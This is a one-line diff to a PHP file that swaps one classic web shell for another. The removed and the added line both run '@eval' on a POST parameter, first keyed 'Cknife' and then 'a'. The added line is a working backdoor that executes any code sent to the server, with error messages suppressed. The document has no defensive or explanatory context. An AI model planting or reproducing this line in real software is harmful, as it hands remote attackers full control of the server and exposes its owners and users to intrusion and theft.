@@ -1,1 +1,1 @@
-<?php @eval($_POST['Cknife']);?>
+<?php @eval($_POST['a']);?>
